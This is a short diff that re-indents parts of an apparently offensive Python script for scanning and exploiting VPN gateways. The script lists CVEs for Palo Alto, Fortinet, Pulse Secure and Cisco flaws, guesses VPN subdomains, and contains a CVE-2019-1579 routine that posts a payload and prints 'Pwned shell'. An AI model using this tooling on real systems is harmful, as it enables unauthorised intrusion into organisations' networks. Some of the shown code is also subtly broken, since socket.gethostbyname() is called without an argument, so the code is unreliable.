@@ -9,8 +9,8 @@ requests.packages.urllib3.disable_warnings()
 
 
 cvelist = ['CVE-2019-1579', 'CVE-2018-13380', 'CVE-2018-13381',
-	  'CVE-2018-13379', 'CVE-2019-11507', 'CVE-2019-11510',
-	  'CVE-2019-11542', 'CVE-2019-11540', 'CVE-2020-3187']
+          'CVE-2018-13379', 'CVE-2019-11507', 'CVE-2019-11510',
+          'CVE-2019-11542', 'CVE-2019-11540', 'CVE-2020-3187']
 # Updating this list ...
 vpnsub = ['vpn', 'covpn', 'tcovpn', 'panvpn', 'vpn-blr', 'vpn-blr1',
           'vpn-west', 'vpn-east', 'vpn-sin', 'vpn-cai', 'westvpn',
@@ -104,7 +104,7 @@ def cve_2019_1579(host, port):
     if not sign in wh and len(wh) < 50:
         print('Pwned shell from %s to %s' % (host, socket.gethostbyname()))
         print('')
-	data = "scep-profile-name=cd"
+        data = "scep-profile-name=cd"
         t = requests.post(url, data=data, verify=False).text.replace('\n', '')
         o = 'unix'
         if len(t) > 10:
